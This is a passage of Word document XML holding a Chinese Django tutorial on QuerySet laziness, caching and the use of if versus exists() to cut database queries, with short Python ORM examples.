            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django基础(11): 表单集合Formset的高级用法</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3AA06C7D"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5" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django基础(12): Request对象详解及开发显示用户IP地址和浏览器APP</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="376EC317" w14:textId="0F56D554" w:rsidR="001C47AF" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">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030</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId266" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="003802BB">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>Django基础(13): 深夜放干货。QuerySet特性及高级使用技巧，如何减少数据库的访问，节省内存，提升网站性能。</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0A11E778" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django基础(12): 深夜放干货。QuerySet特性及高级使用技巧，如何减少数据库的访问，节省内存，提升网站性能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BE99A84" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>原创 大江狗 </w:t>
      </w:r>
      <w:hyperlink r:id="rId267" w:history="1">
        <w:r w:rsidRPr="003802BB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2018-08-11</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD9B56E" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>来自专辑</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A124A59" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django基础连载</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CACCB00" w14:textId="73786814" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>对于中大型网站或Web APP而言，最影响网站性能的就是数据库查询部分了。一是因为反复从数据库读写数据很消耗时间和计算资源，二是当返回的查询数据集queryset非常大时还会占据很多内存。小编我今天就介绍下Django的数据库接口QuerySet的特性，并总结分享下高效使用QuerySet的一些技巧。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BF48522" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>什么是QuerySet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EA443C9" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>QuerySet是Django提供的强大的数据库接口(API)。正是因为通过它，我们可以使用filter, exclude, get等方法进行数据库查询，而不需要使用原始的SQL语言与数据库进行交互。从数据库中查询出来的结果一般是一个集合，这个集合叫就做 queryset。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC97F6F" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="132ACAA0" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果你还不知道如何使用QuerySet对数据库进行最基本的查询(如Article.objects.all())，请阅读下面两篇文章。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BAC14FE" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django QuerySet查询基础。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43AE4F4E" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django如何对数据库进行增删改查</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11254712" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E2427F2" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django的QuerySet是惰性的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C1D67C6" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django的QuerySet是惰性的。下例中article_list试图从数据库查询一个标题含有django的全部文章列表。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F22F03E" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>article_list = Article.objects.filter(title__contains="django")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A676824" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>但是当我们定义article_list的时候，Django的数据接口QuerySet并没有对数据库进行任何查询。无论你加多少过滤条件，Django都不会对数据库进行查询。只有当你需要对article_list做进一步运算时（比如打印出查询结果，判断是否存在，统计查询结果长度)，Django才会真正执行对数据库的查询(见下例1)。这个过程被称为queryset的执行(evaluation)。Django这样设计的本意是尽量减少对数据库的无效操作，比如查询了结果而不用是计算资源的很大浪费。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EC5BA25" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># example 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6754FFE2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>for article in article_list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D9A7DFE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(article.title)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C132363" w14:textId="42E95CD0" w:rsidR="00995934" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="354185FA" w14:textId="73A1B270" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django的QuerySet自带缓存(Cache)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DBD88C9" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在例1中，当你遍历queryset(article_list)时，所有匹配的记录会从数据库获取。这些结果会载入内存并保存在queryset内置的cache中。这样如果你再次遍历或读取这个article_list时，Django就不需要重复查询了，这样也可以减少对数据库的查询。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B354D00" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26D7EBDE" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>下例中例2比例3要好，因为在你打印文章标题后，Django不仅执行了查询，还把查询到的article_list放在了缓存里。这个article_list是可以复用的。例3就不行了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06DF1F61" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Example 2: Good</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40FB8AA6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>article_list = Article.objects.filter(title__contains="django")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43793575" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>for article in article_list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77070F24" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(article.title)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="058AA91E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C30BDA5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Example 3: Bad</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AB30A5F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>for article in Article.objects.filter(title__contains="django"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44806895" w14:textId="04E8312C" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(article.title)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D38FA2B" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5DE1F586" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>用if也会导致queryset的执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4094EE78" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>不知道你注意到上述例2中有个问题没有？万一article_list是个空数据集呢? 虽然for....in...用到空集合上也不会出现raise什么错误，但专业优秀的我们怎么能允许这样的低级事情发生呢？最好的做法就是在loop前加个if判断（例4）。因为django会对执行过的queryset进行缓存(if也会导致queryset执行, 缓存article_list)，所以我们在遍历article_list时不用担心Django会对数据库进行二次查询。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D61C14" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Example 4: Good</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="370497AA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>article_list = Article.objects.filter(title__contains="django")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65412EBB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>if article_list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C1DF4A4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    for article in article_list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26AAF83B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(article.title)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4728F8E3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C8D54CD" w14:textId="0801C681" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("No records")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44FB02D5" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>但有时我们只希望了解查询的结果是否存在，而不需要使用整个数据集，这时if触发整个queryset的缓存变成了一件坏事情。哎，程序员要担心的事情着不少。这时你可以用exists()方法。与if判断不同，exists只会检查查询结果是否存在，返回True或False，而不会缓存article_list(见例5）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="161F4278" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
